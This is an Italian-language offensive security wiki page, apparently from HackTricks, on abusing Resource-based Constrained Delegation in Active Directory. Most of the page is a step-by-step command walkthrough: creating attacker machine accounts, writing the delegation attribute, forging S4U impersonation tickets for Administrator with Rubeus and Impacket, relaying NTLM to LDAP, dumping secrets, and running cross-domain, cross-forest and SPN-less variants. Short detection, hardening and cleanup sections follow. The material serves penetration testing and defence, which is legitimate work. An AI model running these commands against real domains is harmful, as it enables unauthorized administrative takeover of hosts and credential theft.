# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Nozioni di base sulla Resource-based Constrained Delegation

La Resource-based constrained delegation (RBCD) è simile alla [constrained delegation](constrained-delegation.md), ma la direzione della relazione di trust è invertita. La constrained delegation tradizionale registra a quali servizi un principal può delegare; la RBCD registra sulla **risorsa di destinazione** quali principal possono impersonare utenti verso di essa.<sup>[[12]](#references)</sup>

L'attributo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ dell'oggetto di destinazione contiene un security descriptor che identifica i principal autorizzati ad agire per conto di altre identità su quella risorsa.

Un'altra differenza importante è che un principal con sufficienti **permessi di scrittura su un account computer** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` e diritti simili) potrebbe essere in grado di impostare _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. La configurazione della constrained delegation tradizionale richiede normalmente un accesso amministrativo più privilegiato.<sup>[[1]](#references)</sup>

Più precisamente, la modifica delle impostazioni della constrained delegation classica è normalmente subordinata a `SeEnableDelegationPrivilege` su un domain controller, un diritto generalmente detenuto da amministratori altamente privilegiati. La RBCD sposta la decisione sul security descriptor dell'oggetto di destinazione, quindi l'accesso in scrittura alla proprietà pertinente dell'oggetto computer può essere sufficiente, senza quel diritto utente.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuovi concetti

Il flag **`TrustedToAuthForDelegation`** in `userAccountControl` viene spesso descritto come un prerequisito per **S4U2Self**, ma è un'affermazione incompleta.\
Un service principal con un SPN può richiedere S4U2Self anche senza il flag. Con `TrustedToAuthForDelegation`, il service ticket restituito è **forwardable**; senza, il ticket normalmente **non è forwardable**.<sup>[[5]](#references)</sup>

La constrained delegation tradizionale rifiuta un **TGS non forwardable** nel passaggio S4U2Proxy. La RBCD può accettare quel ticket S4U2Self se il security descriptor della destinazione autorizza il servizio richiedente.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struttura dell'attacco

> Se disponi di **privilegi equivalenti alla scrittura** su un **account computer**, potresti riuscire a ottenere accesso privilegiato a quella macchina.

Supponiamo che l'attaccante disponga già di **privilegi equivalenti alla scrittura sull'oggetto computer della vittima**.

1. L'attaccante **compromette** un account con un **SPN** oppure **ne crea uno** ("Service A"). Per impostazione predefinita, un utente di dominio autenticato può creare fino a 10 oggetti computer, in base a **_MachineAccountQuota_**; un oggetto computer fornisce automaticamente SPN utilizzabili.
2. L'attaccante **abusa del proprio privilegio WRITE** sul computer della vittima (ServiceB) per configurare la **resource-based constrained delegation, consentendo a ServiceA di impersonare qualsiasi utente** verso quel computer della vittima (ServiceB).
3. L'attaccante usa Rubeus per eseguire un **attacco S4U completo** (S4U2Self e S4U2Proxy) da Service A a Service B per un utente **con accesso privilegiato a Service B**.
   1. S4U2Self (dall'account SPN compromesso o creato): richiedere un **TGS che rappresenti Administrator verso Service A** (non forwardable).
   2. S4U2Proxy: usare quel **TGS non forwardable** per richiedere un service ticket che rappresenti **Administrator** verso l'**host della vittima**.
   3. Il ticket non forwardable può comunque funzionare in questo flusso RBCD perché Service A è autorizzato nel security descriptor della risorsa di destinazione.
4. L'attaccante può **eseguire pass-the-ticket** e **impersonare** l'utente per ottenere **accesso a ServiceB della vittima**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` chiude la via predefinita per la creazione di computer, ma non rimuove i diritti di scrittura sull'oggetto computer di destinazione né il controllo di un account esistente. Talvolta è possibile usare come principal delegante un utente ordinario controllato, senza SPN, tramite il [metodo U2U senza SPN](#spn-less-cross-domain--cross-forest-rbcd), anche all'interno di un singolo dominio. Questa via richiede comunque un diritto effettivo di scrittura RBCD, il controllo delle credenziali dell'utente delegante, un'identità impersonata delegabile, un comportamento compatibile con la cifratura Kerberos e una modifica dell'hash NT che interrompa il funzionamento dell'account. Considera questi elementi come prerequisiti distinti: un attributo RBCD vuoto o una quota pari a zero, da soli, non dimostrano né il successo né la sicurezza.

Un descriptor RBCD esistente può indicare anche un **gruppo** anziché direttamente il computer delegante. Se controlli un account computer con SPN e puoi aggiungerlo a quel gruppo, la nuova appartenenza potrebbe fornire il percorso di delega senza modificare l'attributo RBCD del computer di destinazione. Prima di concludere che il percorso funzioni, verifica l'ACL effettiva di scrittura delle appartenenze del gruppo (inclusi gli ACE di negazione), l'appartenenza annidata e l'aggiornamento del token, il SID trustee del descriptor, le restrizioni di delega dell'account impersonato e lo SPN del servizio di destinazione.

Per controllare il valore di _**MachineAccountQuota**_ del dominio puoi usare:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Attacco

### Creazione di un oggetto computer

Puoi creare un oggetto computer all'interno del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Configurazione della delega vincolata basata sulle risorse

**Utilizzando il modulo PowerShell di Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Utilizzo di powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Esecuzione di un attacco S4U completo (Windows/Rubeus)

Per prima cosa, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi ci serve l’hash di quella password:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Questo stamperà gli hash RC4 e AES per quell'account.\
Ora, è possibile eseguire l'attacco:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Puoi generare più ticket per più servizi semplicemente chiedendolo una sola volta usando il parametro `/altservice` di Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Gli utenti possono essere contrassegnati come **"L'account è sensibile e non può essere delegato."** Se questo flag è abilitato, l'account non può essere impersonato tramite questo flusso di delega. BloodHound espone questa proprietà durante l'analisi.

### Strumenti Linux: RBCD end-to-end con Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD usando gli strumenti ufficiali di Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Note
- Se è imposto LDAP signing/LDAPS, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo AES.
- Impacket può riscrivere `sname` ("AnySPN") per alcuni strumenti, ma quando possibile ottieni lo SPN corretto (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD cross-domain e cross-forest

Se il **principal delegante** che controlli si trova in un **dominio diverso** (o persino in una **forest diversa**) rispetto al **computer risorsa**, l'abuso è comunque **RBCD**, ma il flusso dei ticket non segue più il consueto `S4U2Self -> S4U2Proxy` a dominio singolo.

### RBCD cross-domain: configura il principal esterno tramite SID

Quando imposti `msDS-AllowedToActOnBehalfOfOtherIdentity` da un **dominio diverso**, la macchina/l'utente esterno potrebbe **non essere risolvibile tramite nome** nell'LDAP del dominio di destinazione. In tal caso, configura la voce di delega usando il **SID** del principal esterno invece del suo sAMAccountName/UPN.

Questo è particolarmente rilevante quando si inoltra NTLM a LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Note:
- `--sid` indica a `ntlmrelayx.py` di trattare `--escalate-user` come un SID, requisito necessario quando l'account delegante è esterno al dominio di destinazione.
- Anche se lo strumento stampa `User not found in LDAP`, la scrittura della delega può comunque riuscire perché il security descriptor memorizza direttamente il SID esterno.

### RBCD cross-domain: sequenza S4U cross-realm

Una volta che il principal esterno è in `msDS-AllowedToActOnBehalfOfOtherIdentity`, il flusso cross-domain funzionante è:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ottenere un **TGT** per il principal delegante dal suo dominio.
2. Richiedere un **TGT di referral** per `krbtgt/<target-domain>`.
3. Richiedere un **referral S4U2Self cross-realm** per l'utente da impersonare sul DC del dominio di destinazione.
4. Richiedere il ticket **S4U2Self** effettivo per quell'utente nel dominio del delegante.
5. Eseguire **S4U2Proxy** nel dominio del delegante per ottenere un ticket di referral per il dominio di destinazione.
6. Eseguire l'ultimo **S4U2Proxy** sul DC del dominio di destinazione per ottenere il service ticket per `cifs/host.target`, `host/host.target` e così via.

Ecco perché gli strumenti Linux standard spesso non funzionano con RBCD cross-domain:<sup>[[9]](#references)</sup>
- il **realm** della richiesta potrebbe dover essere diverso dal realm del TGT usato nel `TGS-REQ`
- la catena richiede **passaggi S4U2Proxy indipendenti**, non solo `S4U2Self` o `S4U2Self` seguito immediatamente da un singolo `S4U2Proxy`

### RBCD cross-domain da Linux

Synacktiv ha pubblicato un'implementazione di Impacket `getST.py` che riproduce la sequenza cross-realm da Linux gestendo esplicitamente i due KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativamente, i nuovi argomenti sono:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **computer risorsa**
- `-targetdc`: DC del dominio della **risorsa**

### Limitazioni di RBCD tra foreste

RBCD tra foreste presenta un'importante limitazione: **l'utente impersonato deve appartenere alla stessa foresta del principal delegante**. In altre parole, se l'account macchina che controlli si trova in `valhalla.local` e la risorsa target è in `asgard.local`, in genere **non puoi impersonare utenti arbitrari di `asgard.local` verso quella risorsa tramite RBCD**.<sup>[[9]](#references)</sup>

È comunque sfruttabile quando:
- l'utente della **foresta delegante** è **amministratore locale** (o ha altri privilegi) sull'host della risorsa nell'altra foresta
- una trust consente il percorso di autenticazione richiesto e il SID esterno è accettato nel descrittore di sicurezza del computer target

### Particolarità del protocollo RBCD tra foreste

RBCD tra foreste non consiste semplicemente in «cross-domain più una trust». Il flusso osservato presenta due particolarità che i tool più comuni storicamente non gestiscono:<sup>[[9]](#references)</sup>

1. Una richiesta **S4U2Proxy** aggiuntiva che imposta **`PA-PAC-OPTIONS=branch-aware`**
2. Un ticket di servizio finale che può essere restituito usando **RC4** anche quando sono stati richiesti altri etype

Il flusso pratico è:

1. Ottieni un TGT per il principal delegante nella foresta A.
2. Richiedi **S4U2Self** per l'utente da impersonare nella foresta A.
3. Richiedi **S4U2Proxy** nella foresta A per ottenere un TGT di referral per la foresta B.
4. Invia una seconda richiesta **S4U2Proxy** nella foresta A **senza** il ticket S4U2Self come ticket aggiuntivo, ma con `branch-aware` abilitato, per ottenere un altro TGT di referral per la foresta B.
5. Facoltativamente, richiedi un normale ticket di servizio nella foresta B per il principal delegante (questo ticket non è necessario per l'abuso finale).
6. Usa i ticket di referral dei passaggi 3 e 4 per richiedere il ticket **S4U2Proxy** finale nella foresta B, per l'utente della foresta A da impersonare verso lo SPN target.

### RBCD tra foreste da Linux

Lo stesso branch di Impacket di Synacktiv aggiunge uno switch `-forest` per questa logica:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD ricorsivo multi-dominio (3+ domini)

Nelle **foreste multi-dominio**, sia **S4U2Self** sia **S4U2Proxy** possono essere **ricorsivi** invece di fermarsi dopo un referral:

- **S4U2Self ricorsivo**: il primo `S4U2Self` viene inviato al **dominio dell'utente impersonato**, si attraversano gli hop intermedi tra domini padre/figlio tramite normali referral `TGS-REQ` per `krbtgt/<REALM>` e l'**ultimo `S4U2Self`** viene inviato nel **dominio del principal delegante**.
- Questo significa che **basta avere un TGT** per un account computer per poter impersonare un **amministratore di un altro dominio della stessa foresta** e richiedere `cifs/host`, `host/host`, `wsman/host`, ecc.
- **S4U2Proxy ricorsivo** segue la catena di trust allo stesso modo: gli hop intermedi riutilizzano il ticket precedente come TGT mentre richiedono il referral `krbtgt/<REALM>` successivo, e solo l'ultimo hop restituisce il ticket di servizio finale.<sup>[[10]](#references)</sup>

Un esempio pratico all'interno della stessa foresta è:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

Se il **principal delegante è un utente senza SPN**, l'ultimo `S4U2Self` ricorsivo fallisce con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La soluzione alternativa consiste nel **riprovare solo l'ultimo hop con `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versione breve della catena di abuso:

1. Autenticarsi con l'**NT hash** per spingere il KDC a usare **RC4-HMAC (etype 23)**.
2. Richiedere prima **`-self -u2u`** e tenere questo ticket separato dal successivo passaggio proxy.
3. Estrarre la **chiave di sessione del TGT** con `describeTicket.py`.
4. Sostituire l'**NT hash** dell'utente con quella **chiave di sessione** usando `changepasswd.py -newhashes <session_key>`.
5. Riutilizzare il ticket `S4U2Self+U2U` come **`-additional-ticket`** durante una richiesta **`-proxy`** separata.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Avvertenze operative:

- Quando il **primo hop trusted è già un'altra foresta**, preferisci l'algoritmo **branch-aware** (`getST.py ... -forest`) per corrispondere al comportamento nativo di Windows. Se la foresta esterna viene raggiunta solo **più avanti** nella catena, il flusso ricorsivo non branch-aware può comunque funzionare.<sup>[[9]](#references)</sup>
- Sui DC recenti con **Windows Server 2022/2025**, forzare RC4 può causare un errore **`KDC_ERR_ETYPE_NOSUPP`** a causa della deprecazione di RC4; questo può rendere **impossibile RBCD senza SPN**, anche se la RBCD classica basata su SPN continua a funzionare con AES.<sup>[[15]](#references)</sup>
- Esegui **`S4U2Self+U2U` prima di modificare l'hash o la password dell'utente**: `SamrChangePasswordUser` **non ricalcola le chiavi AES Kerberos** dell'account, quindi modificare prima la password può compromettere le successive richieste di ticket.<sup>[[14]](#references)</sup>
- L'account impersonato deve essere ancora **delegabile**: **Protected Users** e gli account con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloccano la catena.

## Note su rilevamento e hardening

- I percorsi RBCD tra domini/foreste vengono ancora creati di solito tramite **abuso di ACL** o **relay-to-LDAP**. Applica **LDAP signing** e **LDAP channel binding** sui DC per interrompere i comuni percorsi di configurazione.
- Verifica chi può scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` sugli oggetti computer e risolvi i SID memorizzati, inclusi quelli dei **foreign security principals**.
- Negli ambienti con molti trust, verifica **Selective Authentication**, **SID filtering** e se utenti di una foresta esterna dispongono di privilegi di **amministratore locale** sugli host che ospitano le risorse.

### Accesso

L'ultima riga di comando eseguirà l'**attacco S4U completo** e inietterà il TGS di Administrator nell'host vittima, in **memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** di Administrator, quindi potrai accedere a **C$**:

```bash
ls \\victim.domain.local\C$
```

### Abusare di diversi service ticket

Scopri i [**service ticket disponibili qui**](silver-ticket.md#available-services).

## Enumerazione, audit e cleanup

### Enumerare i computer con RBCD configurato

PowerShell (decodifica dell'SD per risolvere i SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (leggere o svuotare con un solo comando):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Pulizia / reimpostazione RBCD

- PowerShell (cancella l'attributo):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Errori Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: significa che Kerberos è configurato per non usare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (oppure fornisci gli hash RC4, AES128 e AES256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` per un utente normale: è probabile che il principal delegante **non abbia uno SPN**. Riprova l'**ultimo hop** usando **`S4U2Self+U2U`** anziché un normale `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante RBCD **senza SPN**: i DC recenti potrebbero rifiutare il percorso **RC4-HMAC** forzato richiesto dal trucco `S4U2Self+U2U` + sostituzione della chiave di sessione. Prova invece un percorso RBCD classico **con SPN** e AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: significa che l'ora del computer corrente è diversa da quella del DC e Kerberos non funziona correttamente.
- **`preauth_failed`**: significa che il nome utente e gli hash forniti non consentono l'accesso. Potresti aver dimenticato di includere il carattere "$" nel nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: può significare che:
  - L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non dispone di privilegi sufficienti)
  - Il servizio richiesto non esiste (se richiedi un ticket per winrm ma winrm non è in esecuzione)
  - Il fakecomputer creato ha perso i suoi privilegi sul server vulnerabile e devi ripristinarli.
  - Stai abusando del KCD classico; ricorda che RBCD funziona con ticket S4U2Self non forwardable, mentre KCD richiede ticket forwardable.

## Note, relay e alternative

- Puoi anche scrivere l'SD RBCD tramite AD Web Services (ADWS) se LDAP è filtrato. Vedi:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di Kerberos relay spesso terminano con RBCD per ottenere SYSTEM locale in un solo passaggio. Vedi esempi pratici end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se la firma LDAP/il channel binding sono **disabilitati** e puoi creare un account macchina, strumenti come **KrbRelayUp** possono inoltrare a LDAP un'autenticazione Kerberos indotta, impostare `msDS-AllowedToActOnBehalfOfOtherIdentity` per l'account macchina sul computer oggetto target e impersonare immediatamente **Administrator** tramite S4U da una macchina esterna.<sup>[[8]](#references)</sup>

## References

- [1] [Scodinzolare il cane: abuso della delega vincolata basata sulle risorse per attaccare Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Un'altra parola sulla delega – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Delega vincolata basata sulle risorse Kerberos: compromissione dell'oggetto computer](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Abuso della delega vincolata basata sulle risorse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity ha ucciso il dominio: una panoramica offensiva di Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (ufficiale)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Promemoria rapido per Linux con sintassi recente](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (firma LDAP disabilitata → Kerberos relay verso RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Analisi di RBCD tra domini e tra foreste](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Analisi di RBCD tra domini e tra foreste: parte 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Branch Impacket di Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Panoramica della delega vincolata Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Specifiche aperte Microsoft - S4U2Self tra domini](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Specifiche aperte Microsoft - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Rilevare e correggere l'uso di RC4 in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Specifiche aperte Microsoft – Dettagli di S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
